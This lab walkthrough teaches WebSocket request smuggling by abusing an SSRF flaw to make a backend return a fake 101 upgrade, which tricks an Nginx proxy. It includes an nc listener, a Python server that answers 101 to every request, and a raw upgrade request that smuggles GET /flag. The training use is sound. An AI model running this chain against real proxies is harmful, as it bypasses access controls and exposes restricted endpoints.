Upgrading our Proxy
So far, we've been working with a proxy that won't check the web server's response to determine whether the WebSocket upgrade was successful. In this task, we'll replace the vulnerable Varnish proxy with an Nginx proxy that checks responses before tunnelling requests through a WebSocket connection. The backend application will still have the /socket endpoint enabled with WebSockets and the /flag endpoint as our target. The new application can be accessed via http://10.10.100.252:8002/.
First, let's try running the payload we used in the previous task to see if it works:
Notice how Nginx won't leak the flag despite getting a 426 response for the initial WebSocket upgrade attempt. Since Nginx is checking the response code of the upgrade, it can determine that no valid WebSocket connection was established; therefore, it won't allow us to smuggle the /flag request.
You are free to try the second payload presented in the previous task, but you should obtain similar results.

Tricking the Proxy
Since we can't just smuggle requests anymore, we need to find a way to trick the proxy into believing a valid WebSocket connection has been established. This means we need to somehow force the backend web server to reply to our upgrade request with a fake 101 Switching Protocols response without actually upgrading the connection in the backend.
While we won't be able to do this for all applications, if our target app has some vulnerability that allows us to proxy requests back to a server we control as attackers, we might be able to inject the 101 Switching Protocols response to an arbitrary request. In these special cases, we should be able to smuggle requests through a fake WebSocket connection again.

Leveraging SSRF

In this task's application, we will take advantage of an SSRF vulnerability to simulate a fake WebSocket upgrade. After a quick inspection, we can see that the application allows us to test the status of a URL. Each time we input a URL, the server will make a request to http://10.10.100.252:8002/check-url?server=<url> and return the status code from the corresponding response:
We can use nc in our AttackBox to check if we can direct a request to ourselves. We should get a response similar to this one:
nc -lvnp 5555

This means we can successfully use the SSRF vulnerability to influence the response of the backend server. All we need to do is spin up a web server that returns a 101 status, allowing us to fake a WebSocket upgrade.

Setting up the Attacker's Web Server
We can quickly set up a web server that responds with status 101 to every request with the following Python code:
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
Let's save the code to a file named myserver.py in our AttackBox and run it with the following command:
python3 myserver.py 5555
This should spin up a web server on port 5555 that will reply with a 101 status code to any request.

Faking a WebSocket
We are finally ready to launch our payload. Let's use Burp's Repeater to send a request to /check-url against our malicious server. The request should look like this:
GET /check-url?server=http://10.10.11.155:5555 HTTP/1.1
Host: 10.10.100.252:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.10.100.252:8002
If all goes as expected, you should get a request in your malicious web server and the flag value in Burp (note that you need to add two newlines at the end of your payload in Burp):
Remember that /check-url is not a WebSocket endpoint. We are just manipulating both the request and response that the proxy gets to make it believe this is a real WebSocket. This means that the proxy will tunnel the second request in our payload as if it were part of a WebSocket connection, but the backend will just process the request as HTTP since there's no WebSocket in reality.

